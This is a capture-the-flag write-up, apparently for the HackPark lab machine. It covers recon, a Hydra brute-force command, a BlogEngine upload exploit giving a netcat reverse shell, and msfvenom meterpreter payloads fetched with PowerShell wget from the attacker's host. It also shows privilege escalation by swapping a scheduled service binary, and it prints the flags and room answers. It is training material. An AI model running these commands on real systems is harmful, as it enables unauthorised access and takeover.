
#CTF 

## Recon

With Nmap
```

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
3389/tcp open  ssl     Microsoft SChannel TLS
| fingerprint-strings: 
|   TLSSessionReq: 
|     hackpark0
|     230602105205Z
|     231202105205Z0
|     hackpark0
|     \xd7k
|     DygZ
|     $0"0
|     ^!5o
|     J.q7
|     !7ex
|     S0nl
|_    ?Emk<p5
| ssl-cert: Subject: commonName=hackpark
| Not valid before: 2023-06-02T10:52:05
|_Not valid after:  2023-12-02T10:52:05
|_ssl-date: 2023-06-03T10:54:41+00:00; 0s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.60%I=7%D=6/3%Time=647B1BE7%P=x86_64-pc-linux-gnu%r(TLS
SF:SessionReq,33C,"\x16\x03\x03\x037\x02\0\0M\x03\x03d{\x1b\xe2S\x1c\xb8\x
SF:a4x\x1aR\xa1\x0f\+\x0f\0D\x08\xd8\x81c\x14v\xa9QTq\xdb\xc2\xfe\xc2\x7f\
SF:x20\x905\0\0ud\xad\x83s\xdfF\x1b\xdd\xa9\xcb-\x7f\xa1\xb8\xa9\xb1\xf6\x
SF:ef\xe2\xa4\x9cO\0\xb3N\xe9\xd2\0/\0\0\x05\xff\x01\0\x01\0\x0b\0\x02\xde
SF:\0\x02\xdb\0\x02\xd80\x82\x02\xd40\x82\x01\xbc\xa0\x03\x02\x01\x02\x02\
SF:x10\x14\xb8\x11\n\xd554\x99D\x94\x20\x07W/\re0\r\x06\t\*\x86H\x86\xf7\r
SF:\x01\x01\x05\x05\x000\x131\x110\x0f\x06\x03U\x04\x03\x13\x08hackpark0\x
SF:1e\x17\r230602105205Z\x17\r231202105205Z0\x131\x110\x0f\x06\x03U\x04\x0
SF:3\x13\x08hackpark0\x82\x01\"0\r\x06\t\*\x86H\x86\xf7\r\x01\x01\x01\x05\
SF:0\x03\x82\x01\x0f\x000\x82\x01\n\x02\x82\x01\x01\0\xa0\x8d\x1c\xac\x9eW
SF:\xcd\xf7\]\xdb\xb9\xefO\xd9r`w\xe0\xe9F\xc2\x13\xc12\(\xdb!\xcc\xeb\xa4
SF:\x8f\xf3\xca\x06\r4\xd8\+\x96\xa3D\x13\xeb\xd3G\x95\x1dQ\xb4\\\xd7k\xba
SF:\xfc\x99\xe9\xf9\x0c\xfc\xfe\xcd\x9c\x96DygZ\xff=\xdb}\xef\x0cD\xb2\.\x
SF:97'\xf0{\xc7\x92\xc3\x04\x9a\xac\.;\x02D\xc08\xce\xa7Uj\x07\xeb\x1b\xa4
SF:\x1dt\xadd\xe7\xe0\xed\xb7X\xe9\*9\xbb\xfc\x88;\xef\xfc\x94:\xcd\xf9\xc
SF:d\xee\xc4\x06\xf4\x0bD\xdaG\x96Z\x13\xea\x0eD\xd1\xbb\x8b\x0e\x1a=\xf5\
SF:x1d\xaf\xad\x95\xe9\x9e\xfc\x83\x07\xf8\xb0#X\x9a~\x0c\xee\xb8C\xae\x17
SF:O\x7f\xd6\xf6\xa1\xd6\x80\x20kA\x89\x80W\x9c\xc1\xeb\x0c<~\xb9=\xaay4\x
SF:e0\xf5\x82U\xf8\xf9\x1ftz\xd8\x87\xfbq\xbf\xfadQ\x8c\xee\xccQ\x04\x82G\
SF:xc5\x86\xbbdZ\xbf\xe9\x03\x0c\|\x98onv\x91\"-\t\x18\x7fb\x89\x07\x84>\x
SF:f7\xdc\xe6\xf1\xf21y\]\x14F\x13\xf3\]\x872m\x04e\x02\x03\x01\0\x01\xa3\
SF:$0\"0\x13\x06\x03U\x1d%\x04\x0c0\n\x06\x08\+\x06\x01\x05\x05\x07\x03\x0
SF:10\x0b\x06\x03U\x1d\x0f\x04\x04\x03\x02\x0400\r\x06\t\*\x86H\x86\xf7\r\
SF:x01\x01\x05\x05\0\x03\x82\x01\x01\0\x80\x04\x207\x86\*\xc4q8\x9c\xcf\x8
SF:5\^!5o\r\xe1@Y\xd02\x94\xdf\xe8\xa3\x1cA\xff\xbe\xe0u\xfc\x02\x81ozp\xb
SF:e\xe6\xa0\xcb\x8ee\xbcp-\xa8w\x11\x7f\x89\x944\xc8\xd4\xdab\x9b#j\xb6\x
SF:a7\xba\xfc/r=\xe3<\xa5\.\tJ\.q7\xf6\xda5\xdd\xaa\xdb\x86\xe7\xd7\xc3\x8
SF:f/\x98\\\]\x01Y8\x13\xad!7ex\x9d\xdd\xc1S0nl\x92v\xf1\xcd\xdf_\x93\xe0\
SF:xee\xa5\x04>#,\xfa\xb9\xc0\(\xd6\xc5t\x7f\+s\x1e\xb9\x99\x9a\xae\xe7\xf
SF:5\"#\x83\xd1@>\x0b\x1c\x93\xf5B\xb8\x07\xfa0\x81\xf4Ox\x11f\x93\xe0\xa8
SF:\xe7&\xe2\xd7\x08\xd0\xe1\x12\x02\xe8\]\xe8>\x9d\x81\x01>\x8d\xc3s\xa7\
SF:xc4\^\xfey\xb7\xe0\xd5\xf3\xf7IB\xa5\^\xc1\x9d\xff3O\xcbpkU\x92!\x0fC\x
SF:c6\xf2\n\x01\xd0\x03\xc7>\[\xe2\xfcA\x8dH\xf7\x8b\xe9\xd7\xec\x07\?Emk<
SF:p5\xa2\xf4\xba0\x84\xd2\xb0\x9e\xcc\x8b\xcb\x20\x0f\xa6\[\xff\x1e\x14\x
SF:ef\x0e\0\0\0");
MAC Address: 02:A0:8C:A5:70:F1 (Unknown)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


```


Gobuster

There are so many results I am not going to post them.

## Using Hydra to brute-force a login

We need to find a login page to attack and identify what type of request the form is making to the webserver. Typically, web servers make two types of requests, a **GET** request which is used to request data from a webserver and a **POST** request which is used to send data to a server.

You can check what request a form is making by right clicking on the login form, inspecting the element and then reading the value in the method field. You can also identify this if you are intercepting the traffic through BurpSuite (other HTTP methods can be found [here](https://www.w3schools.com/tags/ref_httpmethods.asp)).


We need to fill this
```
"<path to login form>:<body, with magic strings ^USER^ and ^PASS^>:<pattern that appears in an invalid login>"
```
The path to the login form is `/Account/login.aspx`

The “pattern that appears in an invalid login” is any text that appears when a login fails, in our case it’s `“Login failed”`.
For the body, we’ll need to go back to Inspect Element and grab the request payload. Within the payload, look for the user and password used in the failed login, and replace those with `^USER^` and `^PASS^` respectively. `hydra` will replace them with the username and password for each try.



I am using this

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt [ip] http-post-form "/Account/login.aspx:__VIEWSTATE=J7%2FrKT%2FRbzXElHvOFArr4HX0BUp05PUs%2Bjl4fN5QtFnsigr6tjwFZkWaUW9RaCNkl5wcaaA9I71WXBKsdywllsO45a8kdE%2BO2GeciLswYLZgMhEIYMOLKvVE1g9%2FuxmOjygsPrfW43YX1axgD3V%2FmbHd2lx7jcwje7Qgkp065G2LekTQ&__EVENTVALIDATION=nIJxL4rdGJE3KYMzFDmVH35CAPYLfmVh68KpFWCfpmOAp8i4dLgnYkYLVP3UEDV8IiIqX6kXoIwujnQvd7xTK1Tbiqg5RF0fYL3q6nazJk37P%2BrLs8lq043TvaeMwGi4uqTkx2onf8prQt9NNxgtS4oXE0haNUx6xQId8O8kqlZfYRAG&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
```

So I get this 
`login: admin   password: 1qaz2wsx`

## Compromise the machine

In this task, you will identify and execute a public exploit (from [exploit-db.com](http://www.exploit-db.com)) to get initial access on this Windows machine!

Exploit-Database is a CVE (common vulnerability and exposures) archive of public exploits and corresponding vulnerable software, developed for the use of penetration testers and vulnerability researches. It is owned by Offensive Security (who are responsible for OSCP and Kali)

I search on Exploit db and find  CVE-2019-6714
I downloaded the script and followed the steps written in the script.
Opened the file and wrote local ip and port inside.
Opened a Netcat connection on that port.
Went on the side, opened a public post.
Renamed the file as PostView.ascx
Clicked on the upload button on the public post and uploaded the file.
Navigated to that link `http://[ip]/?theme=../../App_Data/files`
And we have a connection!
`
## Windows Privilege Escalation

In this task we will learn about the basics of Windows Privilege Escalation.

First we will pivot from netcat to a meterpreter session and use this to enumerate the machine to identify potential vulnerabilities. We will then use this gathered information to exploit the system and become the Administrator.

So I make a shell.exe with
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[local ip] LPORT=[local new port] -f exe -o [shell name].exe
```

Next I open Metasploit and type
`use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST [local ip] set LPORT [local new port] run`

To get the shell.exe on the machine I type
```
powershell -c wget "http://[local ip]:80/shell.exe" -outfile "shell.exe"  
```

I run `shell.exe` on that machine and get the connection on the meterpreter!

Next more enumeration.
I download winPEAS from [Github](https://github.com/carlospolop/PEASS-ng/releases/tag/20230618-1fa055b6)
and the upload it to the machine
the type `shell` and run the exe.

What is the name of the abnormal _service_ running?
WindowsScheduler

What is the name of the binary you're supposed to exploit?
message.exe
To find it 
```
cd C:\Program Files (x86)\SystemScheduler\Events  
type 20198415519.INI_LOG.txt
```

To exploit it I have to make a new shell with
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[local ip] LPORT=8888 -e x86/shikata_ga_nai -f exe -o Message.exe
```

Then I open a new Metasploit instance . I make a new listener to the new port 8888.
On the old instance I upload the Message.exe file with
```
cd "C:\Program Files (x86)\SystemScheduler"  
powershell -c wget "http://[local ip]:80/Message.exe" -outfile "Message.exe"  
```

Then I wait for `WindowsScheduler` to run and execute my Message.exe. And I get my root shell


I find user flag `759bd8af507517bcfaede78a21a73e39`
on `C:\Users\jeff\Desktop`

And under `C:\Users\Administrator\Desktop`
I find root flag `7e13d97f05f7ceb9881a3eb3d78d3e72`

Finally to get the Original Install time
I run `systeminfo | findstr /i date`
`8/3/2019, 10:43:23 AM`